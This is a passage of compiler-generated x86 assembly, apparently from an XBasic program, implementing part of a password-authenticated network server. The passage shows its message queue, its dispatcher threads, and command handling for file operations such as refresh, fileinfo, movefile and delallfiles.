;
; [1785] NEXT m
do.next.00AC.server:
	inc	d[ebp-48]			;;; i229
	jmp	for.00AC.server			;;; i231
end.for.00AC.server:
;
; [1786] QMsg[0].id = 256*256*256*100
	mov	eax,256			;;; i659
	imul	eax,256			;;; i801
	jnc	> A.239			;;; i802
	call	%_eeeOverflow			;;; i803
A.239:
	imul	eax,256			;;; i801
	jnc	> A.240			;;; i802
	call	%_eeeOverflow			;;; i803
A.240:
	imul	eax,100			;;; i801
	jnc	> A.241			;;; i802
	call	%_eeeOverflow			;;; i803
A.241:
	mov	ecx,d[%%6%%QMsg.server]			;;; i663a
	lea	ebx,[ecx]			;;; i464
	mov	d[ebx],eax			;;; i13b
;
; [1787] CASE ELSE			:ret = $$FALSE
	jmp	end.select.00A0.server			;;; i69
case.00A0.0004.server:
	mov	eax,0			;;; i659
	mov	d[ebp-40],eax			;;; i670
;
; [1788] END SELECT
end.select.00A0.server:
;
; [1790] IFF APPLSTATUS THEN ret = -2
	mov	eax,d[%APPLSTATUS.server]			;;; i663a
	test	eax,eax			;;; i194
	jnz	>> else.00AD.server			;;; i195
	mov	eax,2			;;; i659
	neg	eax			;;; i916
	mov	d[ebp-40],eax			;;; i670
else.00AD.server:
end.if.00AD.server:
;
; [1791] ReleaseSemaphore (#hsmQueueMsg,1,NULL)
#ifdef QueueMsg.NULL
#undef QueueMsg.NULL
#endif
#define QueueMsg.NULL ebp-72	; exposes local variable 'NULL'
;
	push	[ebp-72]			;;; i674a
	push	1			;;; i656a
	push	[%#hsmQueueMsg.server]			;;; i672a
	call	_ReleaseSemaphore@12			;;; i619
;
; [1792] RETURN ret
	mov	eax,d[ebp-40]			;;; i665
	jmp	end.func6.server			;;; i258
;
; [1793] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.QueueMsg.server:  ;;; Function end label for Assembly Programmers.
end.func6.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	12			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  QueueMsg ()  *****
;  *****
;
; [1795] FUNCTION DispatchThd1 ()
.code
align 16
_DispatchThd1.server@0:
;  *****
;  *****  FUNCTION  DispatchThd1 ()  *****
;  *****
func7.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func7.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,192			;;; i114a
;
funcBody7.server:
;
; [1796] STRING message
#ifdef DispatchThd1.message
#undef DispatchThd1.message
#endif
#define DispatchThd1.message ebp-40	; exposes local variable 'message'
;
;
; [1799] DO
align 8
do.00AE.server:
;
; [1800] socket = 0: message = ""
#ifdef DispatchThd1.socket
#undef DispatchThd1.socket
#endif
#define DispatchThd1.socket ebp-44	; exposes local variable 'socket'
;
	mov	eax,0			;;; i659
	mov	d[ebp-44],eax			;;; i670
	xor	eax,eax			;;; i3
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1801] ret = QueueMsg ($$QM_READ,@socket,@message)
#ifdef DispatchThd1.ret
#undef DispatchThd1.ret
#endif
#define DispatchThd1.ret ebp-48	; exposes local variable 'ret'
;
	push	[ebp-40]			;;; i674a
	push	[ebp-44]			;;; i674a
	push	2			;;; i656a
	call	func6.server			;;; i619
	mov	ecx,d[esp-8]			;;; i877a
	mov	ebx,d[esp-4]			;;; i877b
	mov	d[ebp-44],ecx			;;; i670
	mov	[ebp-40],ebx			;;; i670
	mov	d[ebp-48],eax			;;; i670
;
; [1802] IF (ret == -2) THEN RETURN
	mov	eax,2			;;; i659
	neg	eax			;;; i916
	mov	ebx,d[ebp-48]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> else.00AF.server			;;; i219
	xor	eax,eax			;;; i862
	jmp	end.func7.server			;;; i258
else.00AF.server:
end.if.00AF.server:
;
; [1803] IFT ret THEN
	mov	eax,d[ebp-48]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.00B0.server			;;; i221
;
; [1804] ProcessCommands(socket,message)
	mov	eax,d[ebp-40]			;;; i665
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp-44]			;;; i674a
	call	funcB.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [1805] ELSE
	jmp	end.if.00B0.server			;;; i107
else.00B0.server:
;
; [1806] Sleep (5)
	push	5			;;; i656a
	call	_Sleep@4			;;; i619
;
; [1807] END IF
end.if.00B0.server:
;
; [1808] LOOP WHILE (ret != -2)
do.loop.00AE.server:
	mov	eax,2			;;; i659
	neg	eax			;;; i916
	mov	ebx,d[ebp-48]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	< do.00AE.server			;;; i193
end.do.00AE.server:
;
; [1809] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.DispatchThd1.server:  ;;; Function end label for Assembly Programmers.
end.func7.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func7.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret						;;; i111d
free.func7.server:
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  DispatchThd1 ()  *****
;  *****
;
; [1811] FUNCTION DispatchThd2 ()
.code
align 16
_DispatchThd2.server@0:
;  *****
;  *****  FUNCTION  DispatchThd2 ()  *****
;  *****
func8.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func8.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,192			;;; i114a
;
funcBody8.server:
;
; [1812] STRING message
#ifdef DispatchThd2.message
#undef DispatchThd2.message
#endif
#define DispatchThd2.message ebp-40	; exposes local variable 'message'
;
;
; [1815] DO
align 8
do.00B1.server:
;
; [1816] socket = 0: message = ""
#ifdef DispatchThd2.socket
#undef DispatchThd2.socket
#endif
#define DispatchThd2.socket ebp-44	; exposes local variable 'socket'
;
	mov	eax,0			;;; i659
	mov	d[ebp-44],eax			;;; i670
	xor	eax,eax			;;; i3
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1817] ret = QueueMsg ($$QM_READ,@socket,@message)
#ifdef DispatchThd2.ret
#undef DispatchThd2.ret
#endif
#define DispatchThd2.ret ebp-48	; exposes local variable 'ret'
;
	push	[ebp-40]			;;; i674a
	push	[ebp-44]			;;; i674a
	push	2			;;; i656a
	call	func6.server			;;; i619
	mov	ecx,d[esp-8]			;;; i877a
	mov	ebx,d[esp-4]			;;; i877b
	mov	d[ebp-44],ecx			;;; i670
	mov	[ebp-40],ebx			;;; i670
	mov	d[ebp-48],eax			;;; i670
;
; [1818] IF (ret == -2) THEN RETURN
	mov	eax,2			;;; i659
	neg	eax			;;; i916
	mov	ebx,d[ebp-48]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> else.00B2.server			;;; i219
	xor	eax,eax			;;; i862
	jmp	end.func8.server			;;; i258
else.00B2.server:
end.if.00B2.server:
;
; [1819] IFT ret THEN
	mov	eax,d[ebp-48]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.00B3.server			;;; i221
;
; [1820] ProcessCommands(socket,message)
	mov	eax,d[ebp-40]			;;; i665
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp-44]			;;; i674a
	call	funcB.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [1821] ELSE
	jmp	end.if.00B3.server			;;; i107
else.00B3.server:
;
; [1822] Sleep (5)
	push	5			;;; i656a
	call	_Sleep@4			;;; i619
;
; [1823] END IF
end.if.00B3.server:
;
; [1824] LOOP WHILE (ret != -2)
do.loop.00B1.server:
	mov	eax,2			;;; i659
	neg	eax			;;; i916
	mov	ebx,d[ebp-48]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	< do.00B1.server			;;; i193
end.do.00B1.server:
;
; [1825] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.DispatchThd2.server:  ;;; Function end label for Assembly Programmers.
end.func8.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func8.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret						;;; i111d
free.func8.server:
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  DispatchThd2 ()  *****
;  *****
;
; [1827] FUNCTION DispatchThd3 ()
.code
align 16
_DispatchThd3.server@0:
;  *****
;  *****  FUNCTION  DispatchThd3 ()  *****
;  *****
func9.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func9.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,192			;;; i114a
;
funcBody9.server:
;
; [1828] STRING message
#ifdef DispatchThd3.message
#undef DispatchThd3.message
#endif
#define DispatchThd3.message ebp-40	; exposes local variable 'message'
;
;
; [1831] DO
align 8
do.00B4.server:
;
; [1832] socket = 0: message = ""
#ifdef DispatchThd3.socket
#undef DispatchThd3.socket
#endif
#define DispatchThd3.socket ebp-44	; exposes local variable 'socket'
;
	mov	eax,0			;;; i659
	mov	d[ebp-44],eax			;;; i670
	xor	eax,eax			;;; i3
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1833] ret = QueueMsg ($$QM_READ,@socket,@message)
#ifdef DispatchThd3.ret
#undef DispatchThd3.ret
#endif
#define DispatchThd3.ret ebp-48	; exposes local variable 'ret'
;
	push	[ebp-40]			;;; i674a
	push	[ebp-44]			;;; i674a
	push	2			;;; i656a
	call	func6.server			;;; i619
	mov	ecx,d[esp-8]			;;; i877a
	mov	ebx,d[esp-4]			;;; i877b
	mov	d[ebp-44],ecx			;;; i670
	mov	[ebp-40],ebx			;;; i670
	mov	d[ebp-48],eax			;;; i670
;
; [1834] IF (ret == -2) THEN RETURN
	mov	eax,2			;;; i659
	neg	eax			;;; i916
	mov	ebx,d[ebp-48]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> else.00B5.server			;;; i219
	xor	eax,eax			;;; i862
	jmp	end.func9.server			;;; i258
else.00B5.server:
end.if.00B5.server:
;
; [1835] IFT ret THEN
	mov	eax,d[ebp-48]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.00B6.server			;;; i221
;
; [1836] ProcessCommands(socket,message)
	mov	eax,d[ebp-40]			;;; i665
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp-44]			;;; i674a
	call	funcB.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [1837] ELSE
	jmp	end.if.00B6.server			;;; i107
else.00B6.server:
;
; [1838] Sleep (5)
	push	5			;;; i656a
	call	_Sleep@4			;;; i619
;
; [1839] END IF
end.if.00B6.server:
;
; [1840] LOOP WHILE (ret != -2)
do.loop.00B4.server:
	mov	eax,2			;;; i659
	neg	eax			;;; i916
	mov	ebx,d[ebp-48]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	< do.00B4.server			;;; i193
end.do.00B4.server:
;
; [1841] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.DispatchThd3.server:  ;;; Function end label for Assembly Programmers.
end.func9.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func9.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret						;;; i111d
free.func9.server:
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  DispatchThd3 ()  *****
;  *****
;
; [1843] FUNCTION DispatchThd4 ()
.code
align 16
_DispatchThd4.server@0:
;  *****
;  *****  FUNCTION  DispatchThd4 ()  *****
;  *****
funcA.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.funcA.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,192			;;; i114a
;
funcBodyA.server:
;
; [1844] STRING message
#ifdef DispatchThd4.message
#undef DispatchThd4.message
#endif
#define DispatchThd4.message ebp-40	; exposes local variable 'message'
;
;
; [1847] DO
align 8
do.00B7.server:
;
; [1848] socket = 0: message = ""
#ifdef DispatchThd4.socket
#undef DispatchThd4.socket
#endif
#define DispatchThd4.socket ebp-44	; exposes local variable 'socket'
;
	mov	eax,0			;;; i659
	mov	d[ebp-44],eax			;;; i670
	xor	eax,eax			;;; i3
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1849] ret = QueueMsg ($$QM_READ,@socket,@message)
#ifdef DispatchThd4.ret
#undef DispatchThd4.ret
#endif
#define DispatchThd4.ret ebp-48	; exposes local variable 'ret'
;
	push	[ebp-40]			;;; i674a
	push	[ebp-44]			;;; i674a
	push	2			;;; i656a
	call	func6.server			;;; i619
	mov	ecx,d[esp-8]			;;; i877a
	mov	ebx,d[esp-4]			;;; i877b
	mov	d[ebp-44],ecx			;;; i670
	mov	[ebp-40],ebx			;;; i670
	mov	d[ebp-48],eax			;;; i670
;
; [1850] IF (ret == -2) THEN RETURN
	mov	eax,2			;;; i659
	neg	eax			;;; i916
	mov	ebx,d[ebp-48]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> else.00B8.server			;;; i219
	xor	eax,eax			;;; i862
	jmp	end.funcA.server			;;; i258
else.00B8.server:
end.if.00B8.server:
;
; [1851] IFT ret THEN
	mov	eax,d[ebp-48]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.00B9.server			;;; i221
;
; [1852] ProcessCommands(socket,message)
	mov	eax,d[ebp-40]			;;; i665
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp-44]			;;; i674a
	call	funcB.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [1853] ELSE
	jmp	end.if.00B9.server			;;; i107
else.00B9.server:
;
; [1854] Sleep (5)
	push	5			;;; i656a
	call	_Sleep@4			;;; i619
;
; [1855] END IF
end.if.00B9.server:
;
; [1856] LOOP WHILE (ret != -2)
do.loop.00B7.server:
	mov	eax,2			;;; i659
	neg	eax			;;; i916
	mov	ebx,d[ebp-48]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	< do.00B7.server			;;; i193
end.do.00B7.server:
;
; [1857] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.DispatchThd4.server:  ;;; Function end label for Assembly Programmers.
end.funcA.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.funcA.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret						;;; i111d
free.funcA.server:
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  DispatchThd4 ()  *****
;  *****
;
; [1859] FUNCTION ProcessCommandB (pmessage)
.code
;
#ifdef ProcessCommandB.pmessage
#undef ProcessCommandB.pmessage
#endif
#define ProcessCommandB.pmessage ebp+8	; exposes function argument 'pmessage'
;
align 16
_ProcessCommandB.server@4:
;  *****
;  *****  FUNCTION  ProcessCommandB ()  *****
;  *****
funcC.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
	sub	esp,220			;;; i114a
;
funcBodyC.server:
;
; [1860] SHARED client
;
; [1862] ProcessCommands (client,CSTRING$(pmessage))
	sub	esp,64			;;; i487
	mov	eax,d[ebp+8]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_cstring.d			;;; i573
	add	esp,64			;;; i600
	push	eax			;;; i667a
	push	[%client.server]			;;; i672a
	call	funcB.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [1863] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.ProcessCommandB.server:  ;;; Function end label for Assembly Programmers.
end.funcC.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  ProcessCommandB ()  *****
;  *****
;
; [1865] FUNCTION ProcessCommands (socket,STRING message)
.code
;
#ifdef ProcessCommands.socket
#undef ProcessCommands.socket
#endif
#define ProcessCommands.socket ebp+8	; exposes function argument 'socket'
;
;
#ifdef ProcessCommands.message
#undef ProcessCommands.message
#endif
#define ProcessCommands.message ebp+12	; exposes function argument 'message'
;
align 16
_ProcessCommands.server@8:
;  *****
;  *****  FUNCTION  ProcessCommands ()  *****
;  *****
funcB.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.funcB.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,3				;;; ..
	xor	eax,eax			;;; ...
A.262:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.262			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,164			;;; i114a
;
funcBodyB.server:
;
; [1866] SHARED NETWORK
;
; [1867] STATIC str$
data section 'globals$statics'
align	4
%B%str$.server:	db 4 dup ?
.code
;
; [1870] IFZ message THEN RETURN $$FALSE
	mov	eax,[ebp+12]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.259			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.00BA.server			;;; i192
A.259:
	mov	eax,0			;;; i659
	jmp	end.funcB.server			;;; i258
else.00BA.server:
end.if.00BA.server:
;
; [1871] str$ = message
	mov	eax,[ebp+12]			;;; i665
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %B%str$.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1872] GetToken (@str$,@cmd$,32)
#ifdef ProcessCommands.cmd$
#undef ProcessCommands.cmd$
#endif
#define ProcessCommands.cmd$ ebp-40	; exposes local variable 'cmd$'
;
	push	32			;;; i656a
	push	[ebp-40]			;;; i674a
	push	[%B%str$.server]			;;; i672a
	call	funcF.server			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	ebx,d[esp-8]			;;; i877b
	mov	[%B%str$.server],ecx			;;; i668
	mov	[ebp-40],ebx			;;; i670
;
; [1874] SELECT CASE UCASE$(cmd$)
	sub	esp,64			;;; i487
	mov	eax,[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_ucase.d.v			;;; i583
	add	esp,64			;;; i600
; .selectB.00BB = ebp-44	; internal variable
	mov	esi,[ebp-44]			;;; i665
	mov	[ebp-44],eax			;;; i670
	call	%____free			;;; i260
;
; [1875] CASE "AUTH"			:GetToken (str$,@auth$,32)
	mov	eax,addr @_string.03AB.server			;;; i663
	mov	ebx,[ebp-44]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.00BB.0001.server			;;; i71
	mov	eax,d[%B%str$.server]			;;; i663a
	call	%_clone.a0			;;; i634
; .xstkB.0000 = ebp-52	; internal variable
	mov	d[ebp-52],eax			;;; i670
#ifdef ProcessCommands.auth$
#undef ProcessCommands.auth$
#endif
#define ProcessCommands.auth$ ebp-56	; exposes local variable 'auth$'
;
	push	32			;;; i656a
	push	[ebp-56]			;;; i674a
	push	[ebp-52]			;;; i674a
	call	funcF.server			;;; i619
	sub	esp,12			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	mov	ecx,d[esp+4]			;;; i877a
	mov	[ebp-56],ecx			;;; i670
	add	esp,12			;;; i633
;
; [1876] auth$ = TRIM$(trim(auth$,32))
	sub	esp,64			;;; i487
	mov	eax,d[ebp-56]			;;; i665
	call	%_clone.a0			;;; i634
	mov	d[ebp-52],eax			;;; i670
	push	32			;;; i656a
	push	[ebp-52]			;;; i674a
	call	func12.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
	mov	d[esp],eax			;;; i887
	call	%_trim.d.s			;;; i583
	add	esp,64			;;; i600
	lea	ebx,[ebp-56]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1877] IF auth$ == $$SR_AUTHPASS THEN
	mov	eax,[ebp-56]			;;; i665
	mov	ebx,addr @_string.18E4.server			;;; i663
	call	%_string.compare.vv			;;; i690
	jne	>> else.00BC.server			;;; i219
;
; [1878] #authok = $$TRUE
	mov	eax,-1			;;; i659
	mov	d[%#authok.server],eax			;;; i668
;
; [1879] SendMsg (socket,"AUTHOK\r\nCMSG *** Welcome "+ #cip$+" ***")
	mov	eax,addr @_string.03AE.server			;;; i663
	mov	ebx,[%#cip$.server]			;;; i663a
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.03B0.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [1880] ELSE
	jmp	end.if.00BC.server			;;; i107
else.00BC.server:
;
; [1881] #authok = $$FALSE
	mov	eax,0			;;; i659
	mov	d[%#authok.server],eax			;;; i668
;
; [1882] SendMsg (socket,"CMSG *** AUTH FAILED ***\r\nCMSG --"+auth$+"--")
	mov	eax,addr @_string.03B1.server			;;; i663
	mov	ebx,[ebp-56]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.03B2.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [1883] END IF
end.if.00BC.server:
;
; [1884] END SELECT
case.00BB.0001.server:
end.select.00BB.server:
;
; [1886] IFT #authok THEN
	mov	eax,d[%#authok.server]			;;; i663a
	test	eax,eax			;;; i220
	jz	>> else.00BD.server			;;; i221
;
; [1887] SELECT CASE LCASE$(cmd$)
	sub	esp,64			;;; i487
	mov	eax,[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_lcase.d.v			;;; i583
	add	esp,64			;;; i600
; .selectB.00BE = ebp-60	; internal variable
	mov	esi,[ebp-60]			;;; i665
	mov	[ebp-60],eax			;;; i670
	call	%____free			;;; i260
;
; [1888] CASE "refresh"		:ClientRefresh (socket,str$)
	mov	eax,addr @_string.03B3.server			;;; i663
	mov	ebx,[ebp-60]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.00BE.0001.server			;;; i71
	mov	eax,d[%B%str$.server]			;;; i663a
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func3E.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [1889] CASE "fileinfo"		:ClientFileInfo (socket,str$)
	jmp	end.select.00BE.server			;;; i69
case.00BE.0001.server:
	mov	eax,addr @_string.03B4.server			;;; i663
	mov	ebx,[ebp-60]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.00BE.0002.server			;;; i71
	mov	eax,d[%B%str$.server]			;;; i663a
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func3F.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [1890] CASE "movefile"		:ClientRenameFile (socket,str$)
	jmp	end.select.00BE.server			;;; i69
case.00BE.0002.server:
	mov	eax,addr @_string.03B5.server			;;; i663
	mov	ebx,[ebp-60]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.00BE.0003.server			;;; i71
	mov	eax,d[%B%str$.server]			;;; i663a
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func3D.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [1891] CASE "delallfiles"	:ClientDelFiles (socket,str$)
	jmp	end.select.00BE.server			;;; i69
case.00BE.0003.server:
	mov	eax,addr @_string.03B6.server			;;; i663
	mov	ebx,[ebp-60]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.00BE.0004.server			;;; i71
